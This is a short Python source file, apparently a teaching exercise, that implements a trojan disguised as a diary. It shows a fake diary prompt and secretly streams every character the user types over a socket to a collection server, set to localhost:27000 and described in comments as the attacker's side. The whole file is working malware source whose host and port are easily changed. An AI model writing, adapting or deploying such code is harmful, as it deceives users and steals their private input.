#!/usr/bin/env python3

""" Implementation of trojan that collects data and sends them to server.
    It acts like an ordinary diary.
"""

import logging
import socket
import sys


class Trojan:
    """ This class represents the implementation of trojan disguised
        as diary.
    """

    def __init__(self, host, port):
        self._host = host
        self._port = port
        # Initialize socket for the connection.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def host(self):
        """ Server that collects obtained data. """
        return self._host

    @host.setter
    def host(self, new_host):
        self._host = new_host

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    @property
    def socket(self):
        """ Client socket. """
        return self._socket

    def collect_data(self):
        """ Secretly collect data and send them to server. """
        # Create a connection to the server.
        try:
            self.socket.connect((self.host, self.port))
        except socket.error:
            logging.debug('Trojan could not connect to the server.')
            return

        # Try to act as an ordinary diary.
        print('Hello, this is your diary. You can type here your notes: ')

        # Read notes written by the victim and send them to the server.
        while True:
            character = sys.stdin.read(1)
            self.socket.send(bytes(character, 'utf-8'))


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Initialize trojan application that acts like an diary.
    trojan = Trojan('localhost', 27000)
    # Collect the data and send them to the server running
    # on the attacket's side.
    trojan.collect_data()
